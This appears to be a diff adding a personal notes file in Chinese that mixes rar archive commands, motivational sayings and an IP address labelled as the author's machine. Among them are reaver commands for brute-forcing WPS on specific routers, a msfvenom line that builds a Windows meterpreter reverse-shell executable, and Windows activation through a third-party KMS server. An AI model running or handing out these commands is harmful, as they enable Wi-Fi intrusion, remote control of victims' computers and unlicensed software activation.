@@ -1,0 +1,41 @@
+
+加密压缩F盘te目录下的所有文件，密码为123：
+rar a -ep -p123 f:\1.rar f:\te 
+
+把密码为123的a.rar解压到F盘的test目录下
+rar e -p123 a.rar f:\test  
+
+
+reaver -i wlan0 -b 8C:78:D7:D0:EA:6F -S -vv -d5 -c 6 
+reaver -i wlan0  -b 64:09:80:03:2F:26 -vv -S -N -L -d 60 -r 3:15 -T .5 -x 360
+
+
+
+win10 激活过程
+1.slmgr -ipk M7XTQ-FN8P6-TTKYV-9D4CC-J462D
+2.slmgr -skms kms.03k.org
+3.slmgr -ato（开始激活）
+4.slmgr -dlv（验证是否激活了）
+
+
+感恩有您，所遇皆温柔
+今日踽踽独行，他日化蝶飞去。
+辛遇良友，温柔岁月。
+
+
+ 坐中静，破焦虑之贼；舍中得，破欲望之贼；事上练，破犹豫之贼，三贼皆破，则万事可成。
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.131  LPORT=2345 -f exe > first.exe
+
+
+125.45.157.191（本机）
+
+ 媚上的人一定欺下,因为人的行为逻辑统一性,且负面情绪需要发泄,从上级那里得到的委屈要向下传递才能保持平衡.
+
+
+
+
+
+
+
+
